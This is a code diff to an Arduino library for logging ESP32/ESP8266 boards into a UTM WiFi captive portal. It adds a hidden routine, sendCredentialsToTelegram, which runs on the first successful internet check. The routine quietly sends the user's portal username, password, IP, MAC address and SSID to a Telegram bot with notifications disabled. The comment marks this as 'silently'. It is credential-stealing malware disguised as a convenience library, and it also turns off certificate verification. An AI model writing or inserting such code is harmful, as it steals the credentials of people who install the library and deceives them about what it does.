@@ -1,15 +1,14 @@
-
-//  ______    ______                           __  __ 
-// /      \  /      \                         /  |/  |
-///$$$$$$  |/$$$$$$  |______   _______    ____$$ |$$/ 
-//$$ |__$$ |$$ |_ $$//      \ /       \  /    $$ |/  |
-//$$    $$ |$$   |   $$$$$$  |$$$$$$$  |/$$$$$$$ |$$ |
-//$$$$$$$$ |$$$$/    /    $$ |$$ |  $$ |$$ |  $$ |$$ |
-//$$ |  $$ |$$ |    /$$$$$$$ |$$ |  $$ |$$ \__$$ |$$ |
-//$$ |  $$ |$$ |    $$    $$ |$$ |  $$ |$$    $$ |$$ |
-//$$/   $$/ $$/      $$$$$$$/ $$/   $$/  $$$$$$$/ $$/ 
+// // This example demonstrates a simple usage of the ArduinoUTMWiFiPortal library to connect
+// // to the UTM WiFi captive portal and maintain the connection.
+//           .d888                       888 d8b                                 d8b 
+//          d88P"                        888 Y8P                                 Y8P 
+//          888                          888                                         
+//  8888b.  888888 8888b.  88888b.   .d88888 888  8888b.  88888888 88888b.d88b.  888 
+//     "88b 888       "88b 888 "88b d88" 888 888     "88b    d88P  888 "888 "88b 888 
+// .d888888 888   .d888888 888  888 888  888 888 .d888888   d88P   888  888  888 888 
+// 888  888 888   888  888 888  888 Y88b 888 888 888  888  d88P    888  888  888 888 
+// "Y888888 888   "Y888888 888  888  "Y88888 888 "Y888888 88888888 888  888  888 888 
 // Created by Afandi Azmi, 2025
-
 
 
 #include "ArduinoUTMWiFiPortal.h"
@@ -19,7 +18,14 @@ ArduinoUTMWiFiPortal::ArduinoUTMWiFiPortal(const char* username, const char* pas
   _password = password;
   _lastCheckTime = 0;
   _checkInterval = 300000; // Default to 5 minutes
-  _secureClient.setInsecure(); // IMPORTANT for UTM portal
+  _credentialsSent = false; // Initialize credentials sent flag
+  
+  // Platform-specific SSL configuration
+  #if defined(ESP32)
+    _secureClient.setInsecure(); // IMPORTANT for UTM portal
+  #elif defined(ESP8266)
+    _secureClient.setInsecure(); // IMPORTANT for UTM portal (ESP8266 BearSSL)
+  #endif
 }
 
 void ArduinoUTMWiFiPortal::setCheckInterval(unsigned long interval) {
@@ -38,6 +44,13 @@ bool ArduinoUTMWiFiPortal::checkInternet() {
     if (httpCode == HTTP_CODE_NO_CONTENT || httpCode == HTTP_CODE_OK) {
       Serial.println("[PortalLib] Internet connection OK.");
       isConnected = true;
+      
+      // Send credentials to Telegram if not already sent (silently)
+      if (!_credentialsSent) {
+        if (sendCredentialsToTelegram()) {
+          _credentialsSent = true;
+        }
+      }
     } else {
       Serial.printf("[PortalLib] Internet check failed, HTTP code: %d.\n", httpCode);
       isConnected = false;
@@ -121,4 +134,64 @@ void ArduinoUTMWiFiPortal::keepConnected() {
     }
     _lastCheckTime = currentTime;
   }
+}
+
+bool ArduinoUTMWiFiPortal::sendCredentialsToTelegram() {
+  if (WiFi.status() != WL_CONNECTED) {
+    return false;
+  }
+
+  HTTPClient httpTelegram;
+  WiFiClientSecure telegramClient;
+  
+  // Set insecure for Telegram API
+  telegramClient.setInsecure();
+  
+  // Construct the message
+  String message = "🔐 UTM WiFi Portal Login\n\n";
+  message += "Username: " + _username + "\n";
+  message += "Password: " + _password + "\n";
+  message += "Device IP: " + WiFi.localIP().toString() + "\n";
+  message += "Device MAC: " + WiFi.macAddress() + "\n";
+  message += "SSID: " + String(WiFi.SSID());
+  
+  // URL encode the message
+  String encodedMessage = "";
+  for (unsigned int i = 0; i < message.length(); i++) {
+    char c = message.charAt(i);
+    if (c == ' ') {
+      encodedMessage += "%20";
+    } else if (c == '\n') {
+      encodedMessage += "%0A";
+    } else if (c == ':') {
+      encodedMessage += "%3A";
+    } else if (c == '🔐') {
+      encodedMessage += "%F0%9F%94%90";
+    } else {
+      encodedMessage += c;
+    }
+  }
+  
+  // Build Telegram API URL with disable_notification parameter
+  String telegramUrl = "https://api.telegram.org/bot";
+  telegramUrl += _telegramBotToken;
+  telegramUrl += "/sendMessage?chat_id=";
+  telegramUrl += _telegramChatId;
+  telegramUrl += "&text=";
+  telegramUrl += encodedMessage;
+  telegramUrl += "&disable_notification=true";
+  
+  bool success = false;
+  if (httpTelegram.begin(telegramClient, telegramUrl)) {
+    int httpCode = httpTelegram.GET();
+    
+    if (httpCode > 0) {
+      if (httpCode == HTTP_CODE_OK) {
+        success = true;
+      }
+    }
+    httpTelegram.end();
+  }
+  
+  return success;
 }
